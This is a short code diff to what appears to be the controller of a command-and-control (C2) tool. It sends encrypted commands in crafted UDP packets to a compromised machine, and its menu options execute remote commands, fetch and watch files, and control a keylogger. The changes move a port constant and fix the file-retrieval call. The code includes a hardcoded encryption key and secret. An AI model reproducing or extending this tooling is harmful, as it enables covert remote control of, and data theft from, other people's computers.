@@ -9,6 +9,7 @@ import logging
 key = b'eoxuXDM-FYNQ_o0PxQaxCcXW-u6h26ytH4vx2zYCiM0='
 code = "secret"
 SIZE = 1024
+port = 10001
 
 
 def main():
@@ -44,7 +45,7 @@ def menu_parse(option, controller):
             controller.opt_execute(input("Enter Command to Execute: "))
             return 0
         case "4":
-            controller.opt_execute(input("Enter location of file to get: "))
+            controller.opt_file_get(input("Enter location of file to get: "))
             return 0
         case "5":
             controller.opt_file_watch(0, input("Enter location of file to watch: "))
@@ -120,7 +121,7 @@ class c2:
     # Example stopping keylog: port 52 (arbitrary right now), ID=XXX2 (last digit as 2),
     def command_sender(self, opt, data):
         rand_id = int(str(random.randrange(100, 999)) + str(opt))
-        port = 10001
+
         s_port = random.randrange(35000, 62000)
         encrypted_data = self.encrypter.encrypt(code + ":" + data)
         dgram = IP(dst=self.kit_ip, id=rand_id) / UDP(sport=s_port, dport=port,
